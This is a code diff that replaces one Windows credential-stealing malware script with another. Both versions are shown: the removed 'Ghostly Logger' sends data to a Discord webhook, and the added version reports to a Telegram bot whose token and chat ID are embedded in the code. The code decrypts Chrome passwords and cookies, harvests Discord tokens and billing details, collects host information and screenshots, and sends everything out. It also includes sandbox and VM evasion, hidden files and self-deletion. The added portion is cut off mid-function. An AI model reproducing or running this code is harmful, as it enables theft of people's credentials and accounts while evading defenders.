@@ -1,2079 +1,599 @@
-import base64
-
-
-
-import difflib
-
-
-
-import json
-
-
-
 import os
-
-
-
-import platform
-
-
-
-import re
-
-
-
-import shutil
-
-
-
-import sqlite3
-
-
-
+import time
+import sys
 import subprocess
 
+required_libraries = [
+    'pyautogui',
+    'wmi',
+    'requests',
+    'sqlite3',
+    'ctypes',
+    'json',
+    'shutil',
+    'telebot',
+    'win32crypt',
+    'Crypto',
+    'urllib3'
+]
 
+def install_missing_libraries():
+    missing_libraries = []
+    for lib in required_libraries:
+        try:
+            __import__(lib)
+        except ImportError:
+            missing_libraries.append(lib)
 
-import uuid
-
-
-
-from base64 import b64decode
-
-
-
-from json import loads
-
-
-
-from platform import platform
-
-
-
-from re import findall, match
-
-
-
-from shutil import copy2
-
-
-
-from sqlite3 import connect
-
-
-
-from subprocess import PIPE, Popen
-
-
-
-from threading import Thread
-
-
-
-from time import localtime, strftime
-
-
-
-from zipfile import ZipFile
-
-
-
-
-
-
-
-import psutil
-
-
-
-import requests
-
-
-
+    if missing_libraries:
+        print("Installing missing libraries...")
+        for lib in missing_libraries:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", lib,"--quiet"])
+            except Exception as e:
+                print(f"Failed to install {lib}: {str(e)}")
+        print("Installation complete.")
+import pyautogui
 import wmi
-
-
-
-from Crypto.Cipher import AES
-
-
-
-from cryptography.fernet import Fernet
-
-
-
-from discord import Embed, File, Webhook
-
-from discord import Webhook
-
-
-# from discord.http import RequestsWebhookAdapter
-
-
-
-
-
-
-
-from PIL import ImageGrab
-
-
-
-from win32api import SetFileAttributes
-
-
-
-from win32con import FILE_ATTRIBUTE_HIDDEN
-
-
-
+import threading
+import requests
+import base64
+from sqlite3 import connect as sql_connect
+from base64 import b64decode
+from json import loads as json_loads, load
+from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+from urllib.request import Request, urlopen
+from json import *
+import shutil
+import ctypes
+import random
+import psutil
+import getpass
+import telebot, urllib,winreg
+import warnings
+from base64 import b64decode
+from io import BytesIO
 from win32crypt import CryptUnprotectData
-
-
-
-
-
-
-
-WEBHOOK_URL = "&WEBHOOK_URL&"
-
-
-
-
-
-
-
-def main(webhook_url):
-
-
-
-	global webhook, embed
-
-
-
-
-
-
-
-	webhook = Webhook.from_url(webhook_url)
-
-
-
-	embed = Embed(title="Ghostly Logger", color=15535980)
-
-
-
-	
-
-
-
-	get_inf()
-
-
-
-	grabtokens()
-
-
-
-	
-
-
-
-	threads = []
-
-
-
-	for thread in [
-
-
-
-		Thread(target=ss),
-
-
-
-		Thread(target=password),
-
-
-
-		Thread(target=cookies),
-
-
-
-		]:
-
-
-
-		
-
-
-
-		thread.start()
-
-
-
-		threads.append(thread)
-
-
-
-		
-
-
-
-	for t in threads:
-
-
-
-			t.join()
-
-
-
-		
-
-
-
-	embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
-
-
-
-	embed.set_footer(text="Ghostly Logger | Made by CNTD all right reserved")
-
-
-
-	embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https://i.imgur.com/29sSeUX.jpg")
-
-
-
-
-
-
-
-	zipup()
-
-
-
-		
-
-
-
-	file = None
-
-
-
-	file = File(f'files-{os.getenv("UserName")}.zip')
-
-
-
-	
-
-
-
-	webhook.send(content="||@here||", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Ghostly x CNTD")
-
-
-
-	
-
-
-
-def pegasus():
-
-
-
-	for func in {
-
-
-
-		main(WEBHOOK_URL), 
-
-
-
-		cleanup(),
-
-
-
-	}:
-
-
-
-		try:
-
-
-
-			func()
-
-
-
-		except:
-
-
-
-			pass
-
-
-
-
-
-
-
-def accinfo():
-
-
-
-	for t in int(tokens):
-
-
-
-		r = requests.get(
-
-
-
-			'https://discord.com/api/v9/users/@me',
-
-
-
-			headers={"Authorization": tokens[t]})
-
-
-
-			
-
-
-
-		username = r.json()['username'] + '#' + r.json()['discriminator']
-
-
-
-		phone = r.json()['phone']
-
-
-
-		email = r.json()['email']
-
-
-
-				
-
-
-
-		embed.add_field(name="🔷  DISCORD INFO", value=f"Username: {username}\nPhone: {phone}\nEmail: {email}", inline=False)
-
-
-
-	
-
-
-
-def get_inf():
-
-
-
-	ip_address = requests.get('http://ipinfo.io/json').json()['ip']
-
-
-
-	mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-
-
-
-
-
-
-
-	p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-
-
-
-	hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
-
-
-
-
-
-
-
-	cwd = os.getcwd()
-
-
-
-	pc_username = os.getenv("UserName")
-
-
-
-	pc_name = os.getenv("COMPUTERNAME")
-
-
-
-	computer_os = platform()
-
-
-
-	
-
-
-
-	cpu = wmi.WMI().Win32_Processor()[0]
-
-
-
-	gpu = wmi.WMI().Win32_VideoController()[0]
-
-
-
-	ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
-
-
-
-  
-
-
-
-	embed.add_field(name="🔷  SYSTEM INFO", value=f"```\nIP: {ip_address}\nMAC: {mac_address}\n\nPC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB\n```", inline=False)
-
-
-
-	
-
-
-
-class grabtokens():
-
-
-
-	def __init__(self):
-
-
-
-
-
-
-
-		self.baseurl = "https://discord.com/api/v9/users/@me"
-
-
-
-		self.appdata = os.getenv("localappdata")
-
-
-
-		self.roaming = os.getenv("appdata")
-
-
-
-		self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
-
-
-
-		self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
-
-
-
-		self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
-
-
-
-
-
-
-
-		try:
-
-
-
-			os.mkdir(os.path.join(self.tempfolder))
-
-
-
-		except Exception:
-
-
-
-			pass
-
-
-
-
-
-
-
-		self.tokens = []
-
-
-
-		self.discord_psw = []
-
-
-
-		self.backup_codes = []
-
-
-
-		
-
-
-
-		self.grabTokens()
-
-
-
-	
-
-
-
-	def getheaders(self, token=None, content_type="application/json"):
-
-
-
-		headers = {
-
-
-
-			"Content-Type": content_type,
-
-
-
-			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-
-
-
-		}
-
-
-
-		if token:
-
-
-
-			headers.update({"Authorization": token})
-
-
-
-		return headers
-
-
-
-	
-
-
-
-	def get_master_key(self, path):
-
-
-
-		with open(path, "r", encoding="utf-8") as f:
-
-
-
-			local_state = f.read()
-
-
-
-		local_state = json.loads(local_state)
-
-
-
-
-
-
-
-		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-
-
-
-		master_key = master_key[5:]
-
-
-
-		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-
-
-		return master_key
-
-
-
-	
-
-
-
-	def decrypt_password(self, buff, master_key):
-
-
-
-		try:
-
-
-
-			iv = buff[3:15]
-
-
-
-			payload = buff[15:]
-
-
-
-			cipher = AES.new(master_key, AES.MODE_GCM, iv)
-
-
-
-			decrypted_pass = cipher.decrypt(payload)
-
-
-
-			decrypted_pass = decrypted_pass[:-16].decode()
-
-
-
-			return decrypted_pass
-
-
-
-		except Exception:
-
-
-
-			return "Failed to decrypt password"
-
-
-
-		
-
-
-
-	def grabTokens(self):
-
-
-
-		global token, tokens
-
-
-
-		
-
-
-
-		paths = {
-
-
-
-			'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
-
-
-
-			'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
-
-
-
-			'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
-
-
-
-			'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
-
-
-
-			'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
-
-
-
-			'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
-
-
-
-			'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
-
-
-
-			'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
-
-
-
-			'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-
-
-
-			'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
-
-
-
-			'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
-
-
-
-			'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
-
-
-
-			'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
-
-
-
-			'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
-
-
-
-		}
-
-
-
-		
-
-
-
-		for _, path in paths.items():
-
-
-
-			if not os.path.exists(path):
-
-
-
-				continue
-
-
-
-			if not "discord" in path:
-
-
-
-				for file_name in os.listdir(path):
-
-
-
-					if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-
-
-
-						continue
-
-
-
-					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-
-
-
-						for regex in (self.regex):
-
-
-
-							for token in findall(regex, line):
-
-
-
-								try:
-
-
-
-									r = requests.get(self.baseurl, headers=self.getheaders(token))
-
-
-
-								except Exception:
-
-
-
-									pass
-
-
-
-								if r.status_code == 200 and token not in self.tokens:
-
-
-
-									self.tokens.append(token)
-
-
-
-			else:
-
-
-
-				if os.path.exists(self.roaming+'\\discord\\Local State'):
-
-
-
-					for file_name in os.listdir(path):
-
-
-
-						if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-
-
-
-							continue
-
-
-
-						for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-
-
-
-							for y in findall(self.encrypted_regex, line):
-
-
-
-								token = None
-
-
-
-								token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-
-
-
-								
-
-
-
-								r = requests.get(self.baseurl, headers=self.getheaders(token))
-
-
-
-								if r.status_code == 200 and token not in self.tokens:
-
-
-
-									self.tokens.append(token)
-
-
-
-
-
-
-
-		if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-
-
-
-			for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
-
-
-
-				for _file in files:
-
-
-
-					if not _file.endswith('.sqlite'):
-
-
-
-						continue
-
-
-
-					for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
-
-
-
-						for regex in (self.regex):
-
-
-
-							for token in findall(regex, line):
-
-
-
-								try:
-
-
-
-									r = requests.get(self.baseurl, headers=self.getheaders(token))
-
-
-
-								except Exception:
-
-
-
-									pass
-
-
-
-								if r.status_code == 200 and token not in self.tokens:
-
-
-
-									self.tokens.append(token)
-
-
-
-		
-
-
-
-		for token in self.tokens:
-
-
-
-			r = requests.get(
-
-
-
-				'https://discord.com/api/v9/users/@me',
-
-
-
-				headers={"Authorization": token})
-
-
-
-				
-
-
-
-			username = r.json()['username'] + '#' + r.json()['discriminator']
-
-
-
-			uid = r.json()['id']
-
-
-
-			phone = r.json()['phone']
-
-
-
-			email = r.json()['email']
-
-
-
-			
-
-
-
-			try:
-
-
-
-				if r.json()['premium_type'] == 1:
-
-
-
-					nitro = 'Nitro Classic'
-
-
-
-				elif r.json()['premium_type'] == 2:
-
-
-
-					nitro = 'Nitro Boost'
-
-
-
-			except IndexError or KeyError:
-
-
-
-				nitro = 'None'
-
-
-
-
-
-
-
-			b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", 
-
-
-
-							headers=self.getheaders(token))
-
-
-
-			
-
-
-
-			if b.json() == []:
-
-
-
-				methods = "None"
-
-
-
-			else:
-
-
-
-				methods = ""
-
-
-
-				for method in b.json():
-
-
-
-					if method['type'] == 1:
-
-
-
-						methods += "💳"
-
-
-
-					elif method['type'] == 0:
-
-
-
-						methods += "<:paypal:973417655627288666>"
-
-
-
-					else:
-
-
-
-						methods += "❓"
-
-
-
-      
-
-
-
-			embed.add_field(name=f"🔷  User: `{username} ({uid})`", value=f"```{token}```\n\n**Email:** `{email}`\n**Phone:** `{phone}`\n**Nitro:** `{nitro}`\n**Methods:** `{methods}`", inline=False)  
-
-
-
-
-
-
-
-def ss():
-
-
-
-	ImageGrab.grab().save("screenshot.png")
-
-
-
-	hide("screenshot.png")
-
-
-
-	
-
-
-
-class password():
-
-
-
-	def __init__(self):
-
-
-
-		self.appdata = os.getenv("localappdata")
-
-
-
-		self.roaming = os.getenv("appdata")
-
-
-
-
-
-
-
-		with open("google-passwords.txt", "w") as f:
-
-
-
-			f.write("Ghostly - Google Chrome Passwords\n\n")
-
-
-
-		hide(".\\google-passwords.txt")
-
-
-
-		
-
-
-
-		if os.path.exists(self.appdata+'\\Google'):
-
-
-
-			self.grabPassword_chrome() 
-
-
-
-		
-
-
-
-		return
-
-
-
-		
-
-
-
-	def get_master_key(self):
-
-
-
-		with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
-
-
-
-			local_state = f.read()
-
-
-
-		local_state = loads(local_state)
-
-
-
-
-
-
-
-		master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-
-
-
-		master_key = master_key[5:]
-
-
-
-		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-
-
-		return master_key
-
-
-
-	
-
-
-
-	def decrypt_password(self, buff, master_key):
-
-
-
-		try:
-
-
-
-			iv = buff[3:15]
-
-
-
-			payload = buff[15:]
-
-
-
-			cipher = AES.new(master_key, AES.MODE_GCM, iv)
-
-
-
-			decrypted_pass = cipher.decrypt(payload)
-
-
-
-			decrypted_pass = decrypted_pass[:-16].decode()
-
-
-
-			return decrypted_pass
-
-
-
-		except:
-
-
-
-			return "Chrome < 80"
-
-
-
-	
-
-
-
-	def grabPassword_chrome(self):
-
-
-
-		master_key = self.get_master_key()
-
-
-
-		
-
-
-
-		login_dbs = [
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
-
-
-
-		]      
-
-
-
-			
-
-
-
-		used_login_dbs = []
-
-
-
-		
-
-
-
-		for login_db in login_dbs:
-
-
-
-			if not os.path.exists(login_db):
-
-
-
-				continue
-
-
-
-			
-
-
-
-			used_login_dbs.append(login_db)
-
-
-
-			
-
-
-
-			try:
-
-
-
-				copy2(login_db, "Loginvault.db")
-
-
-
-			except FileNotFoundError:
-
-
-
-				pass
-
-
-
-			conn = connect("Loginvault.db")
-
-
-
-			cursor = conn.cursor()
-
-
-
-			try:
-
-
-
-				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-
-
-
-				for r in cursor.fetchall():
-
-
-
-					url = r[0]
-
-
-
-					username = r[1]
-
-
-
-					encrypted_password = r[2]
-
-
-
-					decrypted_password = self.decrypt_password(encrypted_password, master_key)
-
-
-
-					if url != "" and username != "" and decrypted_password != "":
-
-
-
-						with open("google-passwords.txt", "a") as f:
-
-
-
-							f.write(f"DB: {login_db}\nSite: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-
-
-
-			except:
-
-
-
-				pass
-
-
-
-			cursor.close()
-
-
-
-			conn.close()
-
-
-
-			try:
-
-
-
-				os.remove("Loginvault.db")
-
-
-
-			except:
-
-
-
-				pass
-
-
-
-			
-
-
-
-		with open(".\\google-passwords.txt", "a") as f:
-
-
-
-			f.write("\n\nUsed Login Dbs:\n")
-
-
-
-			f.write("\n".join(used_login_dbs))    
-
-
-
-			
-
-
-
-class cookies():
-
-
-
-	def __init__(self):
-
-
-
-		self.appdata = os.getenv("localappdata")
-
-
-
-		
-
-
-
-		with open(".\\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-
-
-
-			f.write("Ghosttly - Google Chrome Cookies\n\n")
-
-
-
-		hide(".\\google-cookies.txt")
-
-
-
-		
-
-
-
-		if os.path.exists(self.appdata+'\\Google'):
-
-
-
-			self.grabCookies_Chrome() 
-
-
-
-		return
-
-
-
-	
-
-
-
-	def get_master_key(self, path) -> str:
-
-
-
-		with open(path, "r", encoding="utf-8") as f:
-
-
-
-			c = f.read()
-
-
-
-		local_state = json.loads(c)
-
-
-
-
-
-
-
-		master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-
-
-
-		master_key = master_key[5:]
-
-
-
-		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-
-
-
-		return master_key
-
-
-
-	
-
-
-
-	def decrypt_val(self, buff, master_key) -> str:
-
-
-
-		try:
-
-
-
-			iv = buff[3:15]
-
-
-
-			payload = buff[15:]
-
-
-
-			cipher = AES.new(master_key, AES.MODE_GCM, iv)
-
-
-
-			decrypted_pass = cipher.decrypt(payload)
-
-
-
-			decrypted_pass = decrypted_pass[:-16].decode()
-
-
-
-			return decrypted_pass
-
-
-
-		except Exception:
-
-
-
-			return "Failed to decrypt password"
-
-
-
-		
-
-
-
-	def grabCookies_Chrome(self):
-
-
-
-		master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
-
-
-
-		
-
-
-
-		login_dbs = [
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
-
-
-
-			self.appdata + '\\Google\\Chrome\\User Data\\Profile 6\\Network\\cookies',
-
-
-
-		] 
-
-
-
-		
-
-
-
-		used_login_dbs = []
-
-
-
-		
-
-
-
-		for login_db in login_dbs:
-
-
-
-			if not os.path.exists(login_db):
-
-
-
-				continue
-
-
-
-			used_login_dbs.append(login_db)
-
-
-
-			login = ".\\Loginvault2.db"
-
-
-
-			shutil.copy2(login_db, login)
-
-
-
-			conn = sqlite3.connect(login)
-
-
-
-			cursor = conn.cursor()
-
-
-
-			with open(".\\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
-
-
-
-				cursor.execute(
-
-
-
-					"SELECT host_key, name, encrypted_value from cookies")
-
-
-
-				for r in cursor.fetchall():
-
-
-
-					host = r[0]
-
-
-
-					user = r[1]
-
-
-
-					decrypted_cookie = self.decrypt_val(r[2], master_key)
-
-
-
-					if host != "":
-
-
-
-						f.write(
-
-
-
-							f"DB: {login_db}\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-
-
-
-			cursor.close()
-
-
-
-			conn.close()
-
-
-
-			os.remove(login)
-
-
-
-			
-
-
-
-		with open(".\\google-cookies.txt", "a") as f:
-
-
-
-			f.write("\n\nUsed Login Dbs:\n")
-
-
-
-			f.write("\n".join(used_login_dbs))
-
-
-
-
-
-
-
-def zipup():
-
-
-
-	with ZipFile(f'files-{os.getenv("UserName")}.zip', 'w') as zipf:
-
-
-
-		zipf.write("google-passwords.txt")
-
-
-
-		zipf.write("google-cookies.txt")
-
-
-
-		zipf.write("screenshot.png")
-
-
-
-	
-
-
-
-	hide(f'files-{os.getenv("UserName")}.zip')
-
-
-
-		
-
-
-
-def cleanup():
-
-
-
-	possible_files = [
-
-
-
-     			"google-passwords.txt",
-
-
-
-				"google-cookies.txt",
-
-
-
-				"screenshot.png",
-
-
-
-				f"files-{os.getenv('UserName')}.zip",
-
-
-
-    			]
-
-
-
- 
-
-
-
-	for file in possible_files:
-
-
-
-		if os.path.exists(file):
-
-
-
-			try: os.remove(file)
-
-
-
-			except: pass
-
-
-
-      
-
-
-
-
-
-
-
-def hide(file):
-
-
-
-	SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
-
-
-
- 
-
-
-
-class debug:
-
-
-
-	def __init__(self):
-
-
-
-		if self.checks(): self.self_destruct()
-
-
-
-	
-
-
-
-	def checks(self):
-
-
-
-		debugging = False 
-
-
-
-		
-
-
-
-		# blackList from Rdimo
-
-
-
-		self.blackListedUsers = ["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]
-
-
-
-		self.blackListedPCNames = ["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]
-
-
-
-		self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","00000000-0000-0000-0000-000000000000","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27","79AF5279-16CF-4094-9758-F88A616D81B4",]
-
-
-
-		self.blackListedIPS = ["88.132.231.71","78.139.8.50","20.99.160.173","88.153.199.169","84.147.62.12","194.154.78.160","92.211.109.160","195.74.76.222","188.105.91.116","34.105.183.68","92.211.55.199","79.104.209.33","95.25.204.90","34.145.89.174","109.74.154.90","109.145.173.169","34.141.146.114","212.119.227.151","195.239.51.59","192.40.57.234","64.124.12.162","34.142.74.220","188.105.91.173","109.74.154.91","34.105.72.241","109.74.154.92","213.33.142.50",]
-
-
-
-		self.blacklistedProcesses = ["HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]
-
-
-
-		
-
-
-
-		self.check_process()
-
-
-
-		
-
-
-
-		if self.get_ip(): debugging = True
-
-
-
-		if self.get_hwid(): debugging = True
-
-
-
-		if self.get_pcname(): debugging = True
-
-
-
-		if self.get_username(): debugging = True
-
-
-
-		
-
-
-
-		return debugging
-
-
-
-
-
-
-
-	def check_process(self):
-
-
-
-		for process in self.blacklistedProcesses:
-
-
-
-			if process in (p.name() for p in psutil.process_iter()):
-
-
-
-				self.self_destruct()
-
-
-
-		
-
-
-
-	def get_ip(self):
-
-
-
-		ip = requests.get('http://ipinfo.io/json').json()['ip']
-
-
-
-			
-
-
-
-		if ip in self.blackListedIPS:
-
-
-
-			return True
-
-
-
-		
-
-
-
-	def get_hwid(self):
-
-
-
-		p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-
-
-
-		hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]       
-
-
-
-		
-
-
-
-		if hwid in self.blackListedHWIDS:
-
-
-
-			return True
-
-
-
-		
-
-
-
-	def get_pcname(self):
-
-
-
-		pc_name = os.getenv("COMPUTERNAME")
-
-
-
-		
-
-
-
-		if pc_name in self.blackListedPCNames:
-
-
-
-			return True
-
-
-
-		
-
-
-
-	def get_username(self):
-
-
-
-		pc_username = os.getenv("UserName")
-
-
-
-		
-
-
-
-		if pc_username in self.blackListedUsers:
-
-
-
-			return True
-
-
-
-		
-
-
-
-	def self_destruct(self):
-
-
-
-		os.system("del {}\{}".format(os.path.dirname(__file__), os.path.basename(__file__)))
-
-
-
-		exit()
-
-
-
-	
-
-
-
-if __name__ == '__main__':
-
-
-
-	if os.name != "nt":
-
-
-
-		exit()
-
-
-
-	
-
-
-
-	try: debug(); pegasus()
-
-
-
-	except:
-
-
-
-		try: cleanup()
-
-
-
-		except: exit()
-
+from Crypto.Cipher import AES
+from sys import executable, stderr
+from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
+
+# Your code continues...
+disable_warnings_urllib3()
+
+ghostly = "7134012656:AAFPg1AXnCBiY4T0fJMcfPOEEAe7fPMruvU"
+chatyd = "6764044761"
+bot = telebot.TeleBot(ghostly)
+
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+temp = os.getenv("TEMP")
+username = os.getenv("USERNAME")
+class NullWriter(object):
+    def write(self, arg):
+        pass
+
+warnings.filterwarnings("ignore")
+null_writer = NullWriter()
+stderr = null_writer
+
+ModuleRequirements = [
+    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+]
+for module in ModuleRequirements:
+    try: 
+        __import__(module[0])
+    except:
+        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
+        time.sleep(3)
+def antidebug():
+    checks = [check_windows, check_ip, check_registry, check_dll]
+    for check in checks:
+        t = threading.Thread(target=check, daemon=True)
+        t.start()
+def exit_program(reason):
+    print(reason)
+    ctypes.windll.kernel32.ExitProcess(0)
+def check_dll():
+    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
+    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
+        exit_program('VM Detected')
+def check_windows():
+    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
+    def winEnumHandler(hwnd, ctx):
+        title = ctypes.create_string_buffer(1024)
+        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
